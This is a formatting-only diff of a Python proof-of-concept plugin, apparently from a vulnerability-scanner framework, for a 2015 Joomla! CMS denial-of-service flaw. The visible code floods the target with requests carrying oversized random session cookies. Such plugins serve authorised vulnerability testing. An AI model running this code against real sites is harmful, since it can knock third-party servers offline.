@@ -7,11 +7,12 @@ import urllib
 import urllib2
 import random
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Joomla_0006' # 平台漏洞编号，留空
+    vuln_id = 'Joomla_0006'  # 平台漏洞编号，留空
     name = 'Joomla! CMS DOS漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2015-02-27'  # 漏洞公布时间
     desc = '''
         Joomla! Unsafe Design Contributes To DOS.
@@ -21,6 +22,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Joomla!'  # 漏洞应用名称
     product_version = '<=3.3'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '8fb038ce-fd8f-4f2d-b475-a94dd732bf92'
@@ -34,7 +36,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             _Host = self.target
             try:
                 _Req = requests.session().get(_Host)
@@ -52,15 +54,15 @@ class Poc(ABPoc):
                 return None
 
             for i in range(4000):
-                _Session += random.choice(['0','1','2','3','4','5','6','7','8','9','q','w','e','r','t','y','u','i',
-                                         'o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m'])
+                _Session += random.choice(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i',
+                                           'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm'])
 
             _Cookies = {
-                _SessionID : _Session
+                _SessionID: _Session
             }
 
             HEADER = {
-                'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0'
             }
 
             _Count = 0
@@ -72,15 +74,17 @@ class Poc(ABPoc):
                     #args['success'] = False
                 else:
                     #args['success'] = True
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                        target=self.target, name=self.vuln.name))
                     break
             return None
-                    
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
